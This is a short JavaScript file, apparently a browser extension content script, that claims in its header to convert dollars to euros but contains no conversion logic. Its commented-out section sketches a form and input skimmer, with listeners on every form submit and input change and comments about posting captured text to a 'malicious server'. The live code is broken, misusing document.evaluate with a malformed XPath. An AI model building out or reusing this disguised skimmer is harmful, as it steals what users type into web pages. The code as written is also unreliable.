/* Converts dollars to euros and displays tooltip with converted value. */

// Get all price fields and elements with $ in them
var dollarNodes = document.evaluate('//*[text()=\'$\'', 'document');
for (var nodeName in dollarNodes) {
    console.log(nodeName);
    // PoC change color
    //var currNode = new Node(nodeName);
    //currNode.setAttribute('color', 'red');
}

// Also search document for form inputs
// If form exists add eventListener for on submit to post back to malicious server
// var forms = document.querySelectorAll("form");
// for (var f in forms) {
//     forms[f].addEventListener("submit", function(e) {
//         // TODO: can I snoop on event parameters to jack here?
//         console.log(e);
//     })
// }
//
// // Also search document for input elements or text-area elements
// var inputs = document.querySelectorAll("input");
// for (var i in inputs) {
//     inputs[i].addEventListener("change", function(e) {
//         if (e && e.children && e.children.length > 0) {
//             let text = e.children[0].text;
//             if (text) {
//                 console.log(text);
//             // TODO: send text to server
//             }
//         }
//     })
// }